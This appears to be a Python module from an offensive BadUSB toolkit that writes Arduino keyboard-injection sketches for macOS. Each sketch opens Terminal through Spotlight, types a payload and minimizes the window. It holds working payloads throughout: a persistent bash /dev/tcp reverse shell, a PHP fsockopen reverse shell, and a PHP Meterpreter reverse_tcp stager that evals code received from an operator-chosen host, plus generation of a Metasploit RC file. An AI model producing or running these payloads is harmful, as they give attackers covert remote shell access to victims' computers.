#!/usr/bin/python
#uses HID-Project.h from https://github.com/NicoHood/HID, can be installed from Arduino Library Manager

import sys
import argparse
import os
import subprocess
import coreUtils
import nfoCore

def osxBanner():

  coreUtils.clearScreen()
  print("********************************************************************************************")
  print("*                                                                                          *")
  print("*                                                                                          *")
  print("*                                       OSX Payloads                                       *")
  print("*                                These Payloads are for OSX                                *")
  print("*                                                                                          *")
  print("********************************************************************************************")
  print("\n")

def osxMenu():

  coreUtils.clearScreen()
  menu = {}
  menu['1']="Bash Reverse Shell without nc -e for OSX"
  menu['2']="Reverse Shell in PHP for OSX"
  menu['3']="meterpreter/reverse in PHP for OSX"
  menu['42']="Main Menu"
  menu['99']="Exit"

  while True:
    osxBanner()
    options=menu.keys()
    #options.sort(key=int)
    #for entry in options:
    for entry in sorted(options): 
      print(entry, menu[entry])

    selection=input("\nPlease Select: ") 
    if selection =='1': 
      osxOption1() 
    elif selection == '2': 
      osxOption2()
    elif selection == '3':
      osxOption3()
    elif selection == '42':
      coreUtils.clearScreen()	
      break
    elif selection == '99':
      exit()
    else: 
      print("\n\n***That is not a valid option!***\n\n")

def osxWriteFile(fileName,payloadFunc,payload):

  buffer = "#include <Keyboard.h>\n"
  buffer += "void setup() {\n"
  buffer += "  Keyboard.begin();\n"
  buffer += "  openTerminal();\n"
  buffer += "  delay(1500);\n"

  buffer += "  " + payloadFunc
  buffer += "  closeTerminal();\n"
  buffer += "  Keyboard.end();\n"
  buffer += "}\n"

  buffer += "void pressEnter(){\n"
  buffer += "  Keyboard.press(KEY_RETURN);\n"
  buffer += "  delay(100);\n"
  buffer += "  Keyboard.release(KEY_RETURN);\n"
  buffer += "}\n"

  buffer += "void openTerminal(){\n"
  buffer += "  delay(500);\n"
  buffer += "  Keyboard.press(KEY_LEFT_GUI);\n"
  buffer += "  Keyboard.println(\" \");\n"
  buffer += "  delay(150);\n"
  buffer += "  Keyboard.release(KEY_LEFT_GUI);\n"
  buffer += "  delay(100);\n"
  buffer += "  Keyboard.println(\"terminal\");\n"
  buffer += "  delay(100);\n"
  buffer += "  pressEnter();\n"
  buffer += "  pressEnter();\n"
  buffer += "  delay(500);\n"
  buffer += "}\n"
  buffer += "\n"

  buffer += "void closeTerminal(){\n"
  buffer += "  Keyboard.press(KEY_LEFT_GUI);\n"
  buffer += "  Keyboard.println(\"m\");\n"
  buffer += "  delay(150);\n"
  buffer += "  Keyboard.release(KEY_LEFT_GUI);\n"
  buffer += "  delay(100);\n"
  buffer += "  pressEnter();\n"
  buffer += "}\n"
  buffer += "\n"
  
  buffer += payload

  buffer += "void loop()\n"
  buffer += "{\n"
  buffer += "}\n"

  fileName = coreUtils.checkINO(fileName)
  file = open(fileName,'w')
  file.write(buffer)
  file.close()
  
  print("\n\noutput written to " + fileName)
  input("\nPress Enter to continue and return to Main Menu...")
  coreUtils.clearScreen()

def osxOption1():

  done = False
  looper = False
  remoteIP=""
  remotePort=""
  fileName=""
  
  while looper != True:

    coreUtils.clearScreen()
    print("********************************************************************************************")
    print("*                                                                                          *")
    print("*                  Persistent Bash Reverse Shell without NetCat                            *")
    print("*             This payload will initiate a Bash reverse shell without Netcat               *")
    print("*                   Options are: 1. remote IP 2. Listening Port                            *")
    print("*                                                                                          *")
    print("********************************************************************************************")
    print("\n")

    menu = {}
    menu['0'] = "Info"
    menu['1'] = "Set IP address of the remote server"
    menu['2'] = "Set the listening port of the remote server"
    menu['3'] = "Set Arduino sketch filename"
    menu['4'] = "Write Arduino sketch"
    menu['42']= "Return to previous menu"
    menu['99']= "Exit"

    options=menu.keys()
    #options.sort(key=int)
    #for entry in options: 
    for entry in sorted(options): 
      print(entry, menu[entry])

    print("\n\n")
    if remoteIP != "":
      print("IP of the remote server set to ->  " + remoteIP)
    if remotePort != "":
	    print("Listening port on the remote server set to ->  " + remotePort)
    if fileName != "":
      print("Arduino filename set to ->  " + fileName)
    
    selection=input("\nPlease Select: ") 

    if selection =='1': 
      remoteIP = input("Please enter the IP address of the remote server to connect to: ")
    elif selection == '2':
      remotePort = input("Please enter the listening port on the remote server:")	
    elif selection == '3':
      fileName = coreUtils.getFileName('reverseCmdOSX.ino')
    elif selection == '4':
      if done == False:
        print("\nYou have not set all the options")
        input("Press Enter to return to the menu and set all the options")
      else:
        looper = True
    elif selection == '42': 
      coreUtils.clearScreen()	
      break
    elif selection == '99':
      exit()
    elif selection == '0':
      nfoCore.osx1info()
    else: 
      print("\n\n***That is not a valid option!***\n\n")
      
    if remoteIP != "" and remotePort != "" and fileName != "":
      done = True
    
  if done == True and looper == True: 
    payload = "void ReverseShell(){\n"
    payload += "Keyboard.println(\"nohup bash -c \\\"while true;do bash -i >& /dev/tcp/" +remoteIP+ "/" +remotePort+ " 0>&1 2>&1; sleep 1;done\\\" 1>/dev/null &\");\n"
    payload += "  pressEnter();\n"
    payload += "}\n"
    
    payloadFunc = "ReverseShell();\n"
    
    osxWriteFile(fileName,payloadFunc, payload)


  
def osxOption2():

  done = False
  looper = False
  remoteIP=""
  remotePort=""
  fileName=""

  while looper != True:
  
    coreUtils.clearScreen()
    print("********************************************************************************************")
    print("*                                                                                          *")
    print("*                                   PHP Reverse Shell                                      *")
    print("*             This payload will initiate a reverse shell via PHP, requires PHP             *")
    print("*                   Options are: 1. remote IP 2. Listening Port                            *")
    print("*                                                                                          *")
    print("********************************************************************************************")
    print("\n")

    menu = {}
    menu['0'] = "Info"
    menu['1'] = "Set IP address of the remote server"
    menu['2'] = "Set the listening port of the remote server"
    menu['3'] = "Set Arduino sketch filename"
    menu['4'] = "Write Arduino sketch"
    menu['42']= "Return to previous menu"
    menu['99']= "Exit"

    options=menu.keys()
    #options.sort(key=int)
    #for entry in options: 
    for entry in sorted(options):
      print(entry, menu[entry])

    print("\n\n")
    if remoteIP != "":
      print("IP of the remote server set to ->  " + remoteIP)
    if remotePort != "":
	    print("Listening port on the remote server set to ->  " + remotePort)
    if fileName != "":
      print("Arduino filename set to ->  " + fileName)
    
    selection=input("\nPlease Select: ") 

    if selection =='1': 
      remoteIP = input("Please enter the IP address of the remote server to connect to: ")
    elif selection == '2':
      remotePort = input("Please enter the listening port on the remote server:")	
    elif selection == '3':
      fileName = coreUtils.getFileName('revShellPHP.ino')
    elif selection == '4':
      if done == False:
        print("\nYou have not set all the options")
        input("Press Enter to return to the menu and set all the options")
      else:
        looper = True
    elif selection == '42': 
      coreUtils.clearScreen()	
      break
    elif selection == '99':
      exit()
    elif selection == '0':
      nfoCore.osx2info()
    else: 
      print("\n\n***That is not a valid option!***\n\n")
      
    if remoteIP != "" and remotePort != "" and fileName != "":
      done = True
    
  if done == True and looper == True:
  
    payload = "void ReverseShell(){\n"
    payload += "Keyboard.println(\"php -r '$sock=fsockopen(\\\""+remoteIP+"\\\","+remotePort+");exec(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'\");\n"
    payload += "  pressEnter();\n"
    payload += "}\n"
    
    payloadFunc = "ReverseShell();\n"
    
    osxWriteFile(fileName,payloadFunc, payload)
  
 
def osxOption3():

  done = False
  looper = False
  remoteIP=""
  remotePort=""
  fileName=""
  RCfile=""
  
  while looper != True:

    coreUtils.clearScreen()
    print("********************************************************************************************")
    print("*                                                                                          *")
    print("*                             PHP Meterpreter Reverse TCP                                  *")
    print("*         This payload will initiate a meterpreter/reverse_tcp via PHP, requires PHP       *")
    print("*                   Options are: 1. remote IP 2. Listening Port                            *")
    print("*                                                                                          *")
    print("********************************************************************************************")
    print("\n")

    menu = {}
    menu['0'] = "Info"
    menu['1'] = "Set IP address of the remote server"
    menu['2'] = "Set the listening port of the remote server"
    menu['3'] = "Set Arduino sketch filename"
    menu['4'] = "Set Metasploit RC File name"
    menu['5'] = "Write Arduino sketch"
    menu['42']= "Return to previous menu"
    menu['99']= "Exit"

    options=menu.keys()
    #options.sort(key=int)
    #for entry in options:
    for entry in sorted(options):
      print(entry, menu[entry])

    print("\n\n")
    if remoteIP != "":
      print("IP of the remote server set to ->  " + remoteIP)
    if remotePort != "":
	    print("Listening port on the remote server set to ->  " + remotePort)
    if RCfile != "":
      print("Metasploit RC File name set to ->  " + RCfile)
    if fileName != "":
      print("Arduino filename set to ->  " + fileName)
    
    selection=input("\nPlease Select: ") 

    if selection =='1': 
      remoteIP = input("Please enter the IP address of the remote server to connect to: ")
    elif selection == '2':
      remotePort = input("Please enter the listening port on the remote server:")	
    elif selection == '3':
      fileName = coreUtils.getFileName('reverseMetPHP.ino')
    elif selection == '4':
      RCfile = coreUtils.getRCFileName('reverseMetPHP.rc')

    elif selection == '5':
      if done == False:
        print("\nYou have not set all the options")
        input("Press Enter to return to the menu and set all the options")
      else:
        looper = True
    elif selection == '42': 
      coreUtils.clearScreen()	
      break
    elif selection == '99':
      exit()
    elif selection == '0':
      nfoCore.osx3info()
    else: 
      print("\n\n***That is not a valid option!***\n\n")
      
    if remoteIP != "" and remotePort != "" and fileName != "" and RCfile !="":
      done = True
    
  if done == True and looper == True:  
    payload = "void ReverseShell(){\n"
    payload += "Keyboard.println(\"php -r 'error_reporting(0); $ip = \\\""+remoteIP+"\\\"; $port = "+remotePort+"; if (($f = \\\"stream_socket_client\\\") && is_callable($f)) { $s = $f(\\\"tcp://{$ip}:{$port}\\\");"
    payload += "  $s_type = \\\"stream\\\"; } elseif (($f = \\\"fsockopen\\\") && is_callable($f)) { $s = $f($ip, $port); $s_type = \\\"stream\\\"; } elseif (($f = \\\"socket_create\\\") && is_callable($f))"
    payload += "  { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = \\\"socket\\\"; } else { die(\\\"no socket funcs\\\"); } if (!$s) { die(\\\"no socket\\\");"
    payload += "  } switch ($s_type) { case \\\"stream\\\": $len = fread($s, 4); break; case \\\"socket\\\": $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack(\\\"Nlen\\\", $len); $len = $a[\\\"len\\\"];"
    payload += "  $b = \\\"\\\"; while (strlen($b) < $len) { switch ($s_type) { case \\\"stream\\\": $b .= fread($s, $len-strlen($b)); break; case \\\"socket\\\": $b .= socket_read($s, $len-strlen($b)); break;"
    payload += "  } } $GLOBALS[\\\"msgsock\\\"] = $s; $GLOBALS[\\\"msgsock_type\\\"] = $s_type; eval($b); die();'\");\n"
    payload += "  pressEnter();\n"
    payload += "}\n"
    
    payloadFunc = "ReverseShell();\n"
    
    osxWriteFile(fileName,payloadFunc, payload)
    coreUtils.msfRCfile(remoteIP,remotePort,'php/meterpreter/reverse_tcp',RCfile)
